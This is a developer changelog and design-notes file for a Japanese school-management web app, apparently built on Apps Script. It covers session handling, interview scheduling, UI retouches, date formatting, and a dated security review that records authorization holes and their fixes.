- ⚠️ **`_compactSessions_` rewrites `SESSION_COLS` (8) columns.** At 6 it moved rows up and left
  G/H behind, so a device label landed on a different session.
- ⚠️ **Reads are as wide as the header row** (`_bulkReadSheets_`), so `_issueSessionToken_` writes
  the `Device` / `DeviceId` headers into an older sheet. Without them `getMyAccount` never sees G/H.
- Sessions from before the change show 「端末情報なし（更新前のログイン）」 until that device logs in
  again. `tests/session.test.js` §10, `tests/account.test.js` §8.

⚠️ **A session belongs to an ACCOUNT, and the account is the SHEET.** `_sessionAccountKey_(role, id)`
maps `teacher` → teacher, and anything else → staff, plus the ID. `_usersSessionKey` is the same
function on the client, and the test asserts the two agree for every role shape.
- **ID alone** revoked 営業 5 *and* 教務 5: the two sheets share no ID space.
- ⚠️ **The literal `(role, id)` is ALSO wrong.** A session keeps the role it was issued with, and
  `_resolveUserById_` already warns that it goes stale when someone moves between staff roles. An
  exact match misses a 営業 → 事務 move and leaves them signed in, and the list shows no
  ログイン中.
- `revokeUserSessions`' target role is **appended**. A page loaded before it existed sends nothing,
  and is **refused** rather than matched by ID.

⚠️ **Nobody was ever signed out, not even "on the next action".** Nothing in the client reacted to a
dead session. Every failure went to `showError` → `alert()` and the page stayed up, data included.
A tab switch firing three loads stacked three blocking alerts. What looked like a forced logout
was every action erroring.
- **One name for it:** every session-death throw is `_sessionDeadError_(msg)`, which sets
  `.sessionDead`. Every one of those messages carries 「再度ログインしてください」 and no other
  thrown message does. The client's `_isSessionDead` matches that. The test scans every
  `new Error(` in both server files in **both** directions, because a false match signs someone
  out on an ordinary error.
- `apiRun` wraps every failure. A dead session calls `_forceLogout()` and the caller's handler is
  **not** called; that is what ends the alert storm. The two direct calls (`adminResetPassword`,
  `changeOwnPassword`) ask the same question themselves.
- ⚠️ **One teardown.** `_teardownSession` is `logoutUser`'s old body. `logoutUser` confirms and
  revokes, while `_forceLogout` does neither (the token is already dead). `_forceLogout` is
  idempotent because parallel loads fail together.
- A modal open at the moment of a forced logout stays open under the login screen. Logging back
  in in the same tab finds the form as it was. The closers live in the Esc handler's local map,
  and one of them asks for confirmation, so they are deliberately not called from the teardown.

⚠️ **The idle check: `checkSession`, from a visible idle tab.** Apps Script has no push, so a revoked
screen can only find out by asking.
- It asks only when the tab is **visible** and nothing has proved the session for 60 s. Every
  successful `apiRun` call is proof, so anyone working sends none of these.
- It runs every 2 minutes (`SESSION_CHECK_MS`), and at once on `visibilitychange` / `focus`.
- ⚠️ **It must never write LastSeen.** `resumeSession` is now `_sessionLookup_(token, true)`, and
  `checkSession` calls `_sessionLookup_(token, false)`. That is the same decision, with no second
  copy, minus the touch. With the touch, an open tab would never reach the 30-day idle expiry, and
  最終操作 would mean "has a tab open".
- ⚠️ **It fails OPEN.** Only `e.sessionDead` answers dead; a Sheets error answers alive. Failing
  closed, one hiccup would sign out every open tab at once.
- ⚠️ `SESSION_CHECK_MS` and `_sessionTimer` are declared beside `USERS_SUBS`, above the top-level
  `tryResumeSession()`. `setupInterfaceBasedOnRole` starts the timer and can run during script
  execution (rule 3).
- The driver has two switches. `window.__sessionDead = true` makes every `apiCall` answer
  session-dead. `window.__sessionAlive = false` makes `checkSession` answer dead.

### 面接スケジュール — past slots, and the 新規予約 email

Reported 2026-09-14: a teacher got 【面接予約】新規予約が入りました (2026-09-07) on 9/11. That
email is sent from `saveScheduleBatch` **at the moment of a save**, so something saved the 9/7
slot on 9/11. Two paths were open, and both are closed now. `tests/pastslot.test.js` runs the
real functions in a `vm` sandbox, with a mutation for each guard.

⚠️ **`rowMap` is FIRST-row-wins, and must stay that way.** It was last-row-wins, while the
calendar (`slots.find`) and `_findScheduleRow_` take the first. With two rows for one slot the
screen showed the booked row and the server judged `wasBookedBefore` from an empty duplicate.
Every edit of that booking then emailed 新規予約 again and wrote onto a row nobody could see.
Keys go through `_schedKey_`, which trims; a stray space in a Teacher ID made one slot two keys.
- Duplicates came from two unlocked saves both **appending** the same new slot.
  `saveScheduleBatch` is now a wrapper holding `LockService.getDocumentLock()` (the script lock
  as fallback) around `_saveScheduleBatchLocked_`. It is the document lock, so schedule saves
  never queue behind session writes.
- Rows already duplicated stay in the sheet. `diagnoseScheduleDuplicates()` (editor-run,
  maintenance unlock, read-only) lists them; the first row listed is the live one.

⚠️ **Only the teacher a 交代 was sent to can accept or decline it (2026-09-28).** Both endpoints
took `toTeacherId` from the browser behind "some session exists", so any signed-in account could
answer another teacher's request — the `toggleNotification` shape. `_reassignResponderId_` now takes
the id from the session **and** requires the session's role to be `teacher`: staff and teacher ids
share no namespace, so staff 5 must not answer teacher 5's request. The argument is ignored.
⚠️ `requestReassignment` legitimately takes a browser-sent slot-teacher id (the requester may be the
営業 担当) and is NOT covered by this; it needs its own rule. `tests/reqcollision.test.js` §12.

⚠️ **Emails are queued and sent AFTER the writes and the lock release.** They used to go out
before the row write, so a save that then failed had already told the teacher about a booking.

⚠️ **A slot is past once its START time has passed, in Asia/Tokyo.** `_slotIsPast_` (server)
and `calSlotIsPast` (client) compare `"yyyy-MM-dd HH:mm"` strings. Unparseable counts as **not**
past. The rule is **block new only**: no booking and no 〇/✖ on a past slot that holds no
booking. An existing past booking stays editable and clearable (name typos, no-shows).
- ⚠️ **The server SKIPS a past update, it never throws.** `calFlush` keeps a failed batch
  queued on purpose, so a throw would fail again on every later save. The skip returns
  「過去の日時の枠は予約・変更できません（N件）」, which is actionable and carries no code.
- The client clears `clickable` in `_calCellState`, the single cell mapper, so desktop and mobile
  both get it. `calHandleClick` and `calTeacherToggle` check again, because an open grid can
  cross a start time.
- 日時変更 / 交代: `calRequestDateOptions` offers the displayed week or this week, whichever is
  later, minus days before today. The four endpoints (`requestBookerDateChange`,
  `requestReassignment`, `approveBookerDateChange`, and `acceptReassignment` only when the time
  moves) refuse a past target, because approving an old request would move the interview into
  the past.

#### ホーム's interview list: "Booked" is narrower than "happening" (2026-09-16)

⚠️ **A booking carrying a request DISAPPEARED from ホーム while the bell showed the request.**
`getUpcomingForUser` tested `Status === "Booked"`, but 交代 moves the row to `Reassign_Pending`
until the other teacher accepts and キャンセル依頼 to `Cancel_Request` until an admin approves —
both keep their student, and the interview happens unless somebody acts.

⚠️ **CORRECTION (2026-09-16): this did NOT fix the report that prompted it.** A 営業 reported an
interview booked for that same day missing from ホーム; the booking turned out to have been made
from the **master account**, so 担当 held master's name and the 担当 test correctly matched nothing.
The widening above is a real defect found while investigating, and stands on its own — but do not
read it as the explanation for that report. `diagnoseHomeUpcoming` would have answered it in one
line, which is exactly what it is for.
- **`_scheduleLiveState_(status, student)` is the one home for the rule**: `""` / `"reassign"` /
  `"cancelreq"` / `null`. The row carries `state`, and ホーム marks it with a `.u-badge`, so a
  listed interview says why it is unusual instead of vanishing.
- ⚠️ **The student is what makes the pending states count.** `Reassign_Pending` on an empty row is
  a slot being offered around, not somebody's interview.
- ⚠️ **Every other test in that function also fails SILENTLY** — no `view_admissions`, a 担当 name
  that is not yours, a date outside 今後7日, admin/master (requests only, by decision). An empty
  list looks identical in all five cases, which is why **`diagnoseHomeUpcoming(who)`** exists
  (editor-run, read-only): it names the test that rejected each row for one person and one week,
  and lists every 担当 spelling in the window beside that person's own name.
- `tests/upcoming.test.js` §6 covers the states and **binds the transcription to `Code.js`**, so
  the real guard cannot narrow back while the copy still passes.

### 修了・卒業生進路 retouch (2026-09-16) — the palette, and a graduate search

`tests/destui.test.js` pins it; every guard runs against the old shape.
- ⚠️ **This sub-view had NO css at all** — every colour, padding and alignment inline, which is why
  the finish layer never reached it, and it kept the inline green 出力 that the 学生数 retouch
  flagged as the last one. Now scoped `#sub-view-dest`: 集計表 tonal, 出力 the solid primary,
  修正モード: ON a class rather than an inline paint, the error line on `--alert-danger-text`.
- ⚠️ **Defect fixed: the 修正 picker was hidden from 管理者権限 holders.** `canEdit` read
  `isMasterRole() || currentUser.role === 'admin'` — admin-ness re-derived from the role NAME —
  while `saveDestinationOverride` / `saveDestinationAlias` are guarded by `_isAdminLevel_`. A
  flagged 教務部長 was refused a picker the server would have accepted. It is `isAdminRole()` now,
  which mirrors the server's `user.isAdmin`. The client must never be stricter than the backend.
- **修了生検索 finds a graduate by 名前英語 / ニックネーム / 学籍番号 across every 修了期** — before it, a
  student could only be reached by clicking the summary cell they happen to fall into, which needs
  their cohort and outcome known first.
  - ⚠️ **It runs ENTIRELY IN THE BROWSER, and the server endpoint it shipped with was deleted.**
    A `searchGraduates` endpoint lasted one staging version (v211). Asked whether its 300ms debounce
    could be shorter, the answer was that the debounce was the small half: a Past_DB-reading producer
    is ~419ms (§8.1.1) and every guarded call also pays a ~420ms session resume, so each query cost
    0.7–1.2s and refining a name paid it again. **集計表 had already fetched every graduate into
    `_destPivotRows` once per session**, so the answer was in the page. Measured after: **0.2–0.5ms
    per query, rendered synchronously** — which is also the proof there is no round trip.
  - ⚠️ **`_destAllRows(cb, onErr)` is the ONE loader**, shared by 集計表 and the search, and a second
    caller while a fetch is in flight **queues** rather than firing an identical second request —
    opening 集計表 and typing at the same time is the ordinary case.
  - ⚠️ **`nick` is carried by `getDestinationDetail` for the search alone** — no column shows it.
    Without it a student findable by nickname on the sheet is unfindable in the app, which is the
    one thing local matching would otherwise have lost.
  - ⚠️ Matching goes through `normName` on **both** sides, each field tested separately: a joined
    haystack lets a query match across the seam, and every separator worth trusting is a control
    character (see below).
  - ⚠️ The 80ms debounce now coalesces **rendering** only. A query under 2 characters filters
    nothing, and an emptied box returns to the 未分類 queue rather than erroring.
  - ⚠️ `_destShown.title` marks a search, and the re-render path restores it — otherwise correcting
    one row silently threw the search away and dropped the user back into the queue.
  - ⚠️ **Two matchers for one question would be the second-copy shape** this file keeps recording
    (`_calCellState`, `_resolveUserById_`). If Past_DB ever grows enough to make the shared list
    heavy, 集計表 breaks the same way and the fix is paging for both — not a second endpoint.
- ⚠️ **`destRender`'s summary-cell markup is untouched on purpose.** `tests/desttable.test.js`
  transcribes `cellOpen` / `withPct` / `line` byte for byte, because invalid table markup still
  renders. The retouch stayed in the toolbar, the detail panel and CSS.
- The driver now has `getDestinationReport` / `getDestinationDetail` / `searchGraduates` /
  `getPastStudentDetail` fixtures; without them the tab renders empty and a screenshot proves
  nothing. ⚠️ The report fixture carries a 未分類 value, because that is the DEFAULT panel.

⚠️ **A NUL written into `driver.mjs` made `file` call it binary and every `grep` over it return
nothing** — the §7 failure again, in the one file that check did not scan. It was a string
separator, typed as an escape and written as a raw byte. `tests/cellsafe.test.js` §7 now scans the
driver too, and both search paths test their fields separately instead of joining them.

⚠️ **A pixel diff flagged 募集状況, which had not been touched.** Rendering HEAD's `Index.html` in
the SAME session came out identical to the working tree, and the working tree renders identically
three times running — so the **baseline** was the odd run (the difference was 4,908 px under the
sidebar's `backdrop-filter`). The lesson the ユーザー list and アカウント設定 taught twice: render the
old code before believing a diff in a tab you did not touch.

### 入試関連 retouch (2026-09-14) — same layout, the 寮管理 palette

Tonal secondaries, **one** solid primary per area (＋結果を入力, and each modal's 保存), 削除 as a
red **outline**, filters as chips. Headers were deliberately left as they are.
`tests/admissionsui.test.js` pins it, and every guard is run against the old shape.
- ⚠️ **Styled by id or by an ADDED class, never by replacing one.** The permission buttons keep
  `class + data-perm + data-orig-display` byte for byte, and the row 編集/削除 keep `.btn-save`
  because the mobile block squares them by that class (`ir-edit` / `ir-del` sit beside it).
- ⚠️ **The outline selectors are compound on purpose** (`.btn-save.ir-del:hover:not(:disabled)`):
  a plain `.ir-del:hover` loses to the tonal fill and 削除 turns blue under the mouse.
- **The legend is MINI CELLS on a tinted bar**: the grid's own `.slot-*` classes and the grid's
  own labels (〇 ✖ ! 交代 氏名), outlined in `currentColor`. It was hex literals matching neither the
  grid nor dark mode.
  - ⚠️ **A background colour alone cannot fix it, measured.** The status fills are pale tints:
    1.00–1.14:1 against every light background in the palette, 1.46 at best in dark. Rendered,
    the symbols are 3.05–8.13:1 in both themes. Don't go back to plain colour squares.
  - ⚠️ **過去 is a faded 〇 (`slot-available slot-past`), not a faded empty cell.** That is what a
    past slot looks like on the calendar; the empty version measured 1.00:1. It sits at ~1.9:1
    on purpose, the same fade the real cell has.
  - The test reads each glyph from `_calCellState` **anchored on the status**:
    `slot-cancel-req` also belongs to the incoming-交代 branch, which comes first.
  - ⚠️ The swatch border skips `.slot-cancel-req`, whose dashed border it would otherwise outrank.
- ⚠️ **Defect fixed: `renderIntakeTabs` put the intake name in a single-quoted JS string with
  `escHtmlJs`,** which leaves quotes alone, so a name containing `'` broke its tab. It is
  `escAttrJsStr` now, and the suite runs the real function on `4月'生`.
- Course chips toggle **`on`**, not `active`. The 入学期 tabs above them stay `sub-nav-btn`.
- ⚠️ **The リンク管理 list is rendered by TWO copies** (`renderPlacementConfigList` and its
  re-render). Both were changed identically, and §6 fails if their button markup drifts.
- ⚠️ **`designtokens` §7 read only `class="…"`.** 19 buttons built as `class='…'` in template
  literals escaped the inline-size check and were counted as "class-less icon buttons", so its
  floor of 33 was really 14. Both filters read either quote now. The six picker buttons it had
  hidden moved onto `.btn-xs`.

### アカウント設定 (2026-09-14) — profile bar, two columns, four functions, one fix

Rebuilt from five identical inline-styled boxes into a profile bar (initials, name, role, the
server's `isAdmin` as a badge, email) and cards in an `auto-fit` grid that falls to one column
without a media rule. `tests/account.test.js` runs the real functions with a mutation per guard.

⚠️ **`toggleNotification` took WHOSE row from the browser.** Only "some session exists" guarded
it, so any signed-in user could switch a colleague's email notifications. It now takes the account
from the session, and the arguments are always ignored. With no session it refuses and writes
nothing (until 2026-09-21 observe mode fell back to the arguments there).
Master has no row and is refused with a sentence, not a disabled checkbox.

⚠️ **ログイン中の端末 never lets a token reach the browser.**
- `apiCall` parks the token it just proved as `_authToken` (declared beside `_authUser`, cleared in
  the same `finally`). That is how "this device" is known without the client sending anything.
- A session is named by `_sessionHandle_`: the first 16 hex characters of its SHA-256. It signs
  nobody in if copied; the server recomputes it to find the row.
- `getMyAccount` / `signOutMySession` / `signOutMyOtherSessions` are all scoped by
  `_sessionAccountKey_`, so a teacher and a staff member sharing ID 5 never touch each other's rows.
  Both deletes run under `_withSessionLock_` with a fresh read; the bulk one goes bottom-up.
- `signOutMySession` refuses the current session: ログアウト is for that.
- `getMyAccount` returns `PwUpdatedAt` (column 10) and nothing else from the credential columns.
- After a password change the page offers 「他の端末をすべてログアウト」: a new password does not end
  sessions already issued.

**Theme: ライト / ダーク / 端末に合わせる.** `sms_theme` gains `"system"`; `_themeIsDark(pref,
prefersDark)` is the only decision. The sidebar button still sets an explicit light/dark.
⚠️ `_themeMql` is a `var`: `applySavedTheme` runs at load, and a `let` there is rule 3 waiting to
happen. The `#acctDarkMode` checkbox became `#acctTheme`, so mobile §7 and sidebar §6 were re-pinned
to the new control rather than loosened.

**起動時に開く画面** (`sms_startTab`, `""` = today's remembered-tab behaviour). An allowed choice
wins over both the remembered tab and the first-of-day ホーム. ⚠️ The tab→permission map is now ONE
`_tabAllowed`, used by login and by the settings list; its map lives inside the function because
`setupInterfaceBasedOnRole` can run during script load.

⚠️ **`endpoints.test` counted a word in a COMMENT as a guard.** `logoutSession` passed for months
only because the password comment after it named `resumeSession` inside its body slice; inserting
functions below it surfaced it. It is listed in `PUBLIC` now (holding the token is the
authorization), and `guarded()` reads comment-stripped bodies. Measured before the change: the only
other endpoints guarded by comment text alone were `loginUser` and `triggerAutoSyncStudents`, both
already on explicit lists.

### ホーム (2026-09-14) — greeting bar, count tiles, cards

A greeting bar with the date (Asia/Tokyo), three count tiles (未対応の依頼 / 今後7日の面接 / お知らせ)
that scroll to their card, and やること / お知らせ as cards. `tests/home.test.js`, mutation-checked.
- ⚠️ **`_renderNotifInto` is SHARED with the bell panel**, deliberately (one renderer, or the two
  drift). So the `.nt-*` and `.home-empty` rules are **global**: the bell is a modal outside
  `#view-home`, and a `#view-home`-scoped item rule would leave the bell unstyled.
- State is a `.u-badge` (お知らせ `u-warn`, キャンセル `u-bad`, 交代/日時変更 `u-admin`). The five inline
  accents are gone, including yellow title text on white and the 📢.
- ⚠️ **A request item is `role="button"` + `tabindex="0"` with an Enter/Space handler**, and 既読にする is
  a `<button>` that keeps the `notif-dismiss` class its listener finds. Both were unreachable by keyboard.
- **The tiles count what the browser already holds**, through one pure `_homeStats`; no fetch, and boot
  is untouched. `_notifMerge` already re-renders ホーム, and `_homeCountTodo` refreshes the tiles when the
  interview list lands. ⚠️ 今後7日の面接 is `null` (tile hidden) for every role but teacher and sales,
  the same rule `renderHomeUpcoming` applies. A zero stays on screen, muted, so the row never jumps.
- The driver seeds ホーム **on demand** (`window.__FIX.__homeRequests` / `__homeAnnouncements` via
  `--call`). ⚠️ Filling the boot fixture instead puts a bell badge on every tab and breaks every other
  pixel diff. ⚠️ Opening the bell panel RE-FETCHES and overwrites seeded data, so seed in a
  `setTimeout` after `toggleNotifPanel()`.

### Sidebar retouch (2026-09-14) — the icons are pinned by hash

Asked to retouch the sidebar **without changing the icons**. `tests/sidebarui.test.js` pins a SHA-256 of
all ten sidebar SVGs, taken before the change; any edit to any icon fails it.
- ⚠️ **Defect fixed: expanded, 5 of 7 tabs stacked their label UNDER the icon.** The permission loop
  showed a granted `.nav-btn` with `el.style.display = 'block'`, and that inline value beat
  `.app-sidebar .nav-btn { display: flex }`. Only ホーム and アカウント設定 (no `permission-req`) escaped
  it. It is `'flex'` now. The same inline value also sat gated tabs a few px off ホーム in the phone's
  bottom bar; measured aligned afterwards. **An inline `display` set by JS beats every stylesheet rule
  that is not `!important`** — set the value the layout actually uses, never a generic `block`.
- **Footer:** ログアウト is red text on a transparent row (was a solid red block); the 👤 pill is a
  profile row (initial square, name, role) that opens アカウント設定 and is keyboard-reachable; the bell,
  logout and dark-mode buttons carry labels when expanded; the bell's count now sits inside its icon.
- ⚠️ **Footer elements are styled BY ID.** The stray `</div>` still closes `.sb-footer` after the bell
  (see Mobile); the markup was deliberately not repaired.
- ⚠️ **The mobile block reveals EVERY `.app-sidebar .sb-label` with `!important`.** A label added for the
  expanded desktop panel appears on the phone unless hidden there, hence
  `.app-sidebar .sb-footer .sb-label { display: none !important }` in the media block.
- ⚠️ The one desktop `!important` touched (`body.sidebar-open .app-sidebar #userBadge`) changed its
  **value** to `flex`, not the count, so mobile §1's baseline holds.
- Expanded-only styling (sub-nav guide line and active tick, footer padding) is prefixed
  `body.sidebar-open`, which `_sidebarDrawerAllowed` never sets on a phone.

### Dates on screen — 2026/09/11, and 2026/09/11 10:42 (2026-09-28)

Reported as 学生一覧 mixing `9/11/2026` and `2026/09/11`. Dates reach the screen as a cell's DISPLAY
text, and a **Date cell with no number format of its own displays in the spreadsheet LOCALE** —
month-first in production. Every `new Date()` write and the import's copied source Dates were such
cells. 学生一覧 mixed both in ONE table because `clearContents()` keeps each cell's old format while the
import re-orders the rows.
- **`_dateColumnFormats_` / `_applyDateFormats_` pin a number format on each date column, by header
  name.** Run after every import, from `triggerScheduledBackup`, and by the editor-run
  `applyDateFormats` (maintenance unlock). ⚠️ A new date column goes in that table, or it leaks the
  locale again.
- ⚠️ **Schedule_DB's dates and 募集状況's three dates are pinned to `yyyy-mm-dd`, NOT the display
  format.** The first are exact-string slot keys; the second fill `<input type="date">`.
- ⚠️ **Staging may not show the bug**: its spreadsheet may display year-first. Set its locale to United
  States (File → Settings) to reproduce.
- The same leak made お知らせ never expire (both expiry checks read year-first) and emptied the
  募集 / 面接結果 date inputs. `_toIsoDate` fills both inputs and never guesses a month-first value.
- Client display goes through `formatDateDisplay` / `formatStampDisplay`; ⚠️ every slot key and option
  VALUE stays `YYYY-MM-DD`. `tests/dateformat.test.js`.
- ⚠️ **The driver's `gotoTab` now waits until its tab stays active.** `setupInterfaceBasedOnRole` can
  run twice (resume), and a fresh profile is always "first load of the day", so the app's late switch
  to ホーム won about half the time — every shot became ホーム and a pixel diff of two ホーム pages
  said "identical". That is likely the "bistable" tabs recorded above; check that shots differ from
  EACH OTHER before trusting an "identical".

### 学生一覧 / 面接結果 sorting — one key, and a day count is only a day count (2026-09-28)

`sortSpecificTable` and `sortInterviewsTable` share `_tableSortKey`; the ビザ警告 cell colour reads
`_visaDays`. Each sorter used to carry its own `parseVal`, and they had drifted.
- ⚠️ **`_visaDays` matches `^\d+\s*日$` exactly.** The old rule took the digits of ANY value containing
  日, so `2026年4月10日` → 2026410 sorted after `2026年12月1日` → 2026121, and `週3日` was painted red.
  The app builds ビザ警告 itself (`Code.js`, ~5010) as `OK` / `期限切れ` / `データなし` / `N 日`, so the
  exact rule changes nothing there. `YYYY年M月D日` is now parsed as a real date.
- `tests/tablesort.test.js` runs the real sorters and the real renderer's colours, with the loose rule
  as its mutation.

### 学生数 retouch (2026-09-15) — same layout, the app's palette

学生一覧 → 学生数 and its 増減推移 modal, in the 入試関連 / 寮管理 system. `tests/reportui.test.js`
pins it, and every guard is run against the old shape.
- ⚠️ **出力 is the SOLID primary here, not tonal.** The mobile block had already made
  `#view-students .export-btn` the primary; an inline `#1cc88a` was overriding it on phones. Desktop
  now agrees with the phone. 性別集計 / 増減推移 are tonal. In 増減推移, 保存 is the solid and 出力 /
  ＋−前年度 are tonal.
- **The 総国籍数 pill became two tiles (在籍者数, 国籍数) that SHARE ホーム's `.home-stat` rules** by
  selector list, not a copy. Hover, focus and pointer stay ホーム's: these tiles are not buttons.
  ⚠️ `#totalCountriesBadge` is now a grid container, so `initReportTable` shows it with
  `display = 'grid'`; `'block'` stacks the tiles.
  ⚠️ **The overrides are `div.rep-stats` / `div.rep-stat`, and the `div` is load-bearing.** The shared
  ホーム rules sit ~400 lines below the retouch block at equal specificity, so a plain
  `#sub-view-report .rep-stats` lost on source order: each tile stretched to ~880px, and the CSS
  read as correct. Measured with `driver.mjs eval`, and `reportui.test` §3 pins the selector.
- **Numbers are `.num`, marked by the renderer**, never by `nth-child`. The コース・ビザ table lost
  every inline cell style. ⚠️ The header heights were not touched: `#reportTable`'s row 2 is
  `top: 47px` against row 1's 48px.
- **States:** a failed load now hides 「データを計算中...」 (it stayed on screen for good), and an empty
  result shows `#reportEmpty` instead of a blank page.
- ⚠️ 修了・卒業生進路's 出力 still carries the inline green. Out of scope; it is the next one.
- The driver has a `getLiveReportData` fixture; without it 学生数 renders nothing locally.

### 募集シミュレーション retouch (2026-09-16) — the last 学生一覧 sub-tab

Same grid, same columns, same totals. `tests/simui.test.js` pins it; every guard runs against the
old shape.
- **Measured before** (`driver.mjs eval`): FOUR button colours in one row — `rgb(113,128,150)` (the
  **disabled** ＋入学期を追加, a real state, not a style), the base solid ＋国を追加, an inline GREEN
  出力 and an inline primary 保存. Now: the three secondaries are tonal and **保存 is the one solid**,
  because it is the only control here that writes.
  - ⚠️ **保存 and 出力 are BOTH `.export-btn`.** The tonal rule names `#sub-view-simulation .exp-wrap
    .export-btn` and `#btnSimSave` keeps the primary; a plain `.export-btn` rule flattens both.
  - ⚠️ `#btnSimAddIntake` disables when every intake is already on the grid. The base rule repainted
    it grey, which reads as a different KIND of button; it now gets 寮管理's 0.45-opacity treatment.
- ⚠️ **`simRenderGrid` wrote the table with ~20 inline `style=` attributes** — the reason no finish
  pass had ever reached this screen, since an inline style outranks every rule (the same wall 寮管理
  and 進路 hit). They are `.sim-*` classes now; figures are `tabular-nums`; the projection input uses
  `--r-sm` and the `.fy-block` focus-ring idiom, **rgba fallback kept in front of `--ring`**.
- ⚠️ **The per-intake ✕ was a `<span onclick>` painted `#e74a3b`** — no keyboard path, no dark-mode
  token. It is a `<button class="sx-btn sx-del">`, and `#sub-view-simulation` **joined** the existing
  `#view-dorms .sx-btn, #schedPhraseModal .sx-btn` list rather than getting a copy.
  ⚠️ `dormui.test` counts these controls file-wide: **re-pinned 11 → 12**, never loosened. Its
  disabled-button mutation anchor also had to name its own selector, because this tab now uses the
  same declaration line.
- **Empty state:** no countries renders 「学生データがありません。」 rather than headers over an empty body.
- ⚠️ **The data path is untouched, and `simui` §6 asserts that too**: the country cell keeps
  `sticky-col` + `escHtmlJs(country)` (xss §3), and the export keeps its `rows` / `merges` providers
  (exportmenu §2) — projections live in `simState`, and an `<input>` value is not in `innerText`.
- The 総数 column and 合計 row keep `--total-row-bg`: it is the app's own total colour, used the same
  way in 学生数.

### Security review (2026-10-26) — a session is not a permission

A source review of the anonymous, execute-as-deployer web app found four authorization holes, all
behind a green `endpoints.test`, because that suite counted `_requireSession_` as a guard:
- **申請関連** (`Shinsei_Code.js`): the five data endpoints asked only for a session. A 教務 (no
  `view_shinsei` by default) could read every applicant's passport and phone fields from the
  console and delete records by name. Only the export path had a permission (`export_shinsei`,
  added 2026-09-15). Fixed with `_requireShinseiPerm_` (view to read, edit to write).
- **面接スケジュール**: `saveScheduleBatch`, `requestReassignment` and `requestBookerDateChange`
  asked only for a session, and the one ownership check compared the browser's `actorRole` with
  `"sales"`. Any account could book, cancel or overwrite any teacher's slots and upload files.
  The fix mirrors the screen exactly (decided 2026-10-26, so nobody loses an action the UI
  offers). Two consequences:
  - custom roles now get the 担当 ownership rule the screen always applied;
  - a booking with a blank 担当 is admin-only, as the screen's read-only view already made it.
- **`adminResetPassword`** guarded the caller (`manage_users`) and not the target, and returns the
  temporary password: a non-admin holding `manage_users` could become a 管理者権限 colleague.
  `saveSystemUser` already stopped them *granting* the flag.
- **The two triggers** ran for anyone with master rights and returned the backup report, and the
  throttle was set before any check, so an anonymous call every 30 minutes would have made every
  real backup run skip as "throttled". `ScriptApp` (a new scope) now verifies the `triggerUid`.

The rest of the review, fixed the same day (`tests/authz.test.js` §5–§9):
- **Login**: the escalating global delay (1.5s → 8s) is gone. A delay slows one request, not
  thirty parallel ones (~4–20 guesses a second), and every sleeping failure held one of the
  deployer's executions, so a flood of bad logins could crowd staff out of the whole app. The limit
  is now 5 attempts per sign-in name per 15 minutes, refused without a sleep, with a flat 1s delay
  on a wrong password. `login.test.js` used to TRANSCRIBE the old delay and test the copy; it now
  reads the constants from the source. Its arithmetic is kept honest: 480 guesses per account per
  day still clears a top-1,000 password list in about two days.
  A block is recorded once per window (操作履歴 「ログイン一時停止」, and an email to the person
  blocked), naming the devices behind it and who has signed in from them. Added the same day,
  because the limit can be aimed at a colleague. It is a hint, not proof (no IP reaches the app).
  Common passwords are refused when one is set, also the same day: the limit's own arithmetic said a
  top-1,000 list still falls in about two days. The password-set panel and アカウント設定 say so.
- **Email enumeration**: an unknown email (and a PIN-era account) skipped the 100k-round hash and
  answered measurably faster. Every failed path now spends one hash.
- **Session-only readers**: `getTeacherNotifications` / `getPendingNotifications` read any
  teacher's or 担当's feed by a browser-sent id or name; both now read the session's own.
  `getAllTeachersSchedule` asks `view_admissions` or `view_teacher_schedule`; `getSpecificBuilding`
  (door, mailbox and Wi-Fi codes) asks `getDormData`'s rule.
- **Dorm PDF**: `replaceTag` inserted staff-typed fields raw, and a string replacement read `$&`
  typed into a field as a pattern. It escapes now (the data URI and CSS tags are byte-identical).
- **Forced password change**: enforced only by the panel, so a temporary-password session (or a
  tab left open across an admin reset) could call every endpoint. `apiCall` now refuses it.
- **Stored files**: `getUploadedFile` passes a type on only for documents and images, else
  `application/octet-stream`. Safe already (it downloads); this keeps an inline viewer safe later.

### 担当名チェック removed (2026-10-26)

The 操作履歴・バックアップ tool that listed 面接スケジュール 担当 names matching no account in ユーザー管理
(`diagnoseInChargeMatching` / `runInChargeDiagnostic`). Removed at the maintainer's request as
unused: a booking's 担当 is now its booker's own account name (`confirmBooking`:
`sInCharge = currentUser.name`) and 面接結果 picks 担当 from a staff list, so nothing is typed.
⚠️ The one case it still caught: an account renamed in ユーザー管理 leaves its older bookings under
the old 担当, and their notifications stop matching. The admin-only operations went from seven to
six (the comments restating the count were updated), and `endpoints.test` §11's server ceiling
went from 100 to 99.

